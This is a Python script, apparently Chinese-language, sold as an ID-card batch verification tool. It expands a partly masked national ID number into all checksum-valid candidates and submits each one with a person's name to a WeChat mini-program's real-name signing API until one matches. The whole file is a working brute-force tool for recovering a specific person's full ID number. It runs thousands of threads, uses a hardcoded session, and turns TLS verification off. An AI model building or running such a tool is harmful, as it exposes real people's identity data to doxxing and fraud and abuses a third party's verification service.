import requests
import json
import warnings
import concurrent.futures
import sys
import time
import re
import itertools
import os
import subprocess
import importlib
import threading
from typing import List, Optional

# 自动安装缺少的库
def install_package(package):
    try:
        importlib.import_module(package)
    except ImportError:
        print(f"正在安装缺少的库: {package}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"{package} 安装完成")

# 检查并安装所需库
required_packages = ['requests', 'urllib3']
for package in required_packages:
    install_package(package)

# 现在导入 urllib3 的警告
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=InsecureRequestWarning)

API_URL = "https://mqy.jhxyp.com/?s=/ApiMy/userSign&aid=14&platform=wx&session_id=754a39ead114a0717bb84e4f9a3ae9d0&pid=0&scene=1005"

HEADERS = {
    "Host": "mqy.jhxyp.com",
    "Connection": "keep-alive",
    "content-type": "application/json",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.67(0x18004324) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wxe4787a902e1666c6/15/page-frame.html"
}

class VerificationState:
    """线程安全的验证状态管理类"""
    def __init__(self, total_ids: int):
        self.lock = threading.Lock()
        self.success_flag = False
        self.success_id = ""
        self.completed_count = 0
        self.current_id = ""
        self.auth_expired_flag = False
        self.verify_error_flag = False
        self.total_ids = total_ids
        self.start_time = time.time()
        self.found_ids = []  # 存储所有找到的有效ID
    
    def update_completed(self, id_num: str):
        """更新完成计数"""
        with self.lock:
            self.completed_count += 1
            self.current_id = id_num
    
    def set_success(self, id_num: str):
        """设置成功状态"""
        with self.lock:
            self.success_flag = True
            self.success_id = id_num
            self.current_id = id_num
            self.found_ids.append(id_num)
    
    def add_found_id(self, id_num: str):
        """添加找到的ID"""
        with self.lock:
            self.found_ids.append(id_num)
    
    def get_progress_info(self):
        """获取进度信息"""
        with self.lock:
            progress_percent = (self.completed_count / self.total_ids) * 100
            elapsed = time.time() - self.start_time
            speed = self.completed_count / elapsed if elapsed > 0 else 0
            remaining = (self.total_ids - self.completed_count) / speed if speed > 0 else 0
            return progress_percent, elapsed, speed, remaining
    
    def should_continue(self) -> bool:
        """检查是否应该继续验证"""
        with self.lock:
            return not (self.success_flag or self.auth_expired_flag or self.verify_error_flag)

def verify_single(name: str, id_num: str, state: VerificationState, stop_event: threading.Event):
    """验证单个身份证号"""
    # 如果已经找到结果或被要求停止，直接返回
    if stop_event.is_set() or not state.should_continue():
        return
    
    data = {
        "info": {
            "name": name,
            "cardno": id_num
        }
    }
    
    try:
        response = requests.post(
            API_URL,
            headers=HEADERS,
            json=data,
            verify=False,
            timeout=10
        )
        response.encoding = response.apparent_encoding or "utf-8"
        
        # 更新完成计数
        state.update_completed(id_num)
        
        res_text = response.text
        
        # 调试信息（可选）
        # print(f"\n尝试身份证: {id_num}, 响应: {res_text[:100]}")
        
        # 检查是否签约成功
        if "签约成功" in res_text:
            print(f"\n[发现匹配] 身份证: {id_num}")
            state.set_success(id_num)
            stop_event.set()  # 通知所有线程停止
    except requests.exceptions.Timeout:
        state.update_completed(id_num)
        print(f"\n[超时] 身份证: {id_num}")
    except Exception as e:
        state.update_completed(id_num)
        # 调试信息（可选）
        # print(f"\n尝试身份证 {id_num} 时出错: {str(e)}")

def check_id_length(n):
    if len(str(n)) != 18:
        return False
    else:
        return True

def check_id_data(n):
    n = str(n)
    
    # 检查年份
    try:
        year = int(n[6:10])
        if year > 2030 or year < 1930:
            return False
    except:
        return False
    
    # 检查月份
    try:
        month = int(n[10:12])
        if month > 12 or month < 1:
            return False
    except:
        return False
    
    # 检查日期（简化检查）
    try:
        day = int(n[12:14])
        if day > 31 or day < 1:
            return False
    except:
        return False
    
    # 检查身份证校验码
    var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    
    sum_val = 0
    for i in range(0, 17):
        try:
            sum_val += int(n[i]) * var[i]
        except:
            return False
    
    sum_val %= 11
    if var_id[sum_val] == str(n[17]):
        return True
    else:
        return False

def generate_id():
    """生成身份证号"""
    card = input('请输入模糊身份证号(模糊位用"x"代替，例如:xxxxxxxxxxxxxxxxxx): ')
    
    # 检查输入长度
    if len(card) != 18:
        print("错误: 身份证号必须为18位!")
        return []
    
    # 为每个位置生成可能的数字
    positions = []
    for i in range(18):
        if card[i] == "x" or card[i] == "X":
            if i == 17:  # 最后一位可以是X
                positions.append(["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "X"])
            else:
                positions.append(["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"])
        else:
            positions.append([card[i]])
    
    # 处理性别位（第17位，索引16）
    if card[16] != "x" and card[16] != "X":
        if int(card[16]) % 2 == 0:
            print("检测性别: 女")
        else:
            print("检测性别: 男")
    else:
        m = input("请输入性别('男'或'女'或'未知'): ")
        if m == "男":
            positions[16] = ["1", "3", "5", "7", "9"]
        elif m == "女":
            positions[16] = ["0", "2", "4", "6", "8"]
        # 如果输入"未知"，保持原样
    
    print("开始生成身份证...")
    
    # 清空并创建文件
    with open('sfz.txt', 'w', encoding='utf-8') as f:
        pass
    
    card_list = []
    total_combinations = 1
    for pos in positions:
        total_combinations *= len(pos)
    
    print(f"预计生成 {total_combinations:,} 种组合，这可能需要一些时间...")
    
    generated_count = 0
    start_time = time.time()
    
    # 使用进度显示
    for result in itertools.product(*positions):
        x = "".join(result)
        if check_id_length(x) and check_id_data(x):
            card_list.append(x)
            generated_count += 1
            
            # 每生成1000个显示一次进度
            if generated_count % 1000 == 0:
                elapsed = time.time() - start_time
                print(f"\r已生成: {generated_count:,} 个有效身份证 | 耗时: {elapsed:.1f}秒", end="")
    
    # 写入文件
    if card_list:
        with open("sfz.txt", "a", encoding="utf-8") as f:
            for card_num in card_list:
                f.write(card_num + '\n')
        
        elapsed = time.time() - start_time
        print(f"\n身份证生成完毕✅")
        print(f"共生成 {len(card_list):,} 个有效身份证号")
        print(f"耗时: {elapsed:.1f}秒")
        print(f"结果已保存到 sfz.txt 文件")
        return card_list
    else:
        print(f"\n身份证生成失败❌")
        print("提示: 请检查输入的模糊身份证号格式是否正确")
        return []

def real_name_auth_batch(name: str, id_numbers: List[str]):
    """批量实名验证"""
    print(f"\n开始批量验证，共 {len(id_numbers):,} 个身份证号")
    print("正在连接服务器进行验证...")
    
    # 创建状态管理和停止事件
    state = VerificationState(len(id_numbers))
    stop_event = threading.Event()
    
    # 确定线程数
    max_workers = min(9178, len(id_numbers), 917800000)  # 限制最大线程数，避免被封IP
    
    print(f"使用 {max_workers} 个线程进行验证")
    
    # 使用线程池
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 提交所有任务
        futures = {executor.submit(verify_single, name, id_num, state, stop_event): id_num 
                  for id_num in id_numbers}
        
        # 显示进度
        try:
            last_display_time = time.time()
            while not stop_event.is_set():
                # 检查是否所有任务都已完成
                completed = state.completed_count
                if completed >= len(id_numbers):
                    break
                
                # 定期显示进度
                current_time = time.time()
                if current_time - last_display_time >= 0.1:  # 每0.1秒更新一次
                    progress_percent, elapsed, speed, remaining = state.get_progress_info()
                    
                    sys.stdout.write(f"\r进度: {progress_percent:.1f}% | {completed}/{len(id_numbers)} | "
                                   f"速度: {speed:.1f}个/秒 | 预计剩余: {remaining:.1f}秒 | 当前: {state.current_id}")
                    sys.stdout.flush()
                    last_display_time = current_time
                
                time.sleep(0.05)
        
        except KeyboardInterrupt:
            print("\n\n用户中断验证过程")
            stop_event.set()
            # 取消所有未完成的任务
            for future in futures:
                future.cancel()
    
    elapsed_time = round(time.time() - state.start_time, 1)
    
    # 最终结果显示
    print("\n" + "="*50)
    if state.success_flag:
        print(f"✓ 核验成功!")
        print(f"匹配的身份证: {state.success_id}")
        print(f"姓名: {name}")
        print(f"总耗时: {elapsed_time}秒")
        print(f"验证速度: {len(id_numbers)/elapsed_time:.1f}个/秒")
        
        # 保存结果到文件
        with open("result.txt", "w", encoding="utf-8") as f:
            f.write(f"姓名: {name}\n")
            f.write(f"匹配的身份证: {state.success_id}\n")
            f.write(f"验证时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        print("结果已保存到 result.txt")
    else:
        print(f"✗ 核验完成，未找到匹配的身份证号")
        print(f"总耗时: {elapsed_time}秒")
        if elapsed_time > 0:
            print(f"验证速度: {len(id_numbers)/elapsed_time:.1f}个/秒")
        print("提示: 请检查姓名是否正确，或尝试不同的模糊身份证格式")
    print("="*50)
    
    return state.success_flag, state.success_id

def main():
    print("="*50)
    print("身份证批量验证工具 (线程安全版)")
    print("="*50)
    
    name = input("请输入姓名: ").strip()
    if not name:
        print("姓名不能为空!")
        return
    
    print("\n步骤1: 生成身份证号")
    print("请输入模糊身份证号，其中未知位用'x'表示")
    print("例如: 4101011990xxxx1234")
    print("或者: xxxxxxxxxxxxxxxx (全模糊)")
    
    card_list = generate_id()
    
    if not card_list:
        print("没有生成有效的身份证号，程序退出")
        return
    
    print("\n" + "="*50)
    print("步骤2: 开始批量验证")
    input("按回车键开始验证...")
    
    real_name_auth_batch(name, card_list)

if __name__ == "__main__":
    try:
        main()
        input("\n按回车键退出程序...")
    except KeyboardInterrupt:
        print("\n\n程序被用户中断")
    except Exception as e:
        print(f"\n程序运行出错: {str(e)}")
        import traceback
        traceback.print_exc()
        input("按回车键退出...")
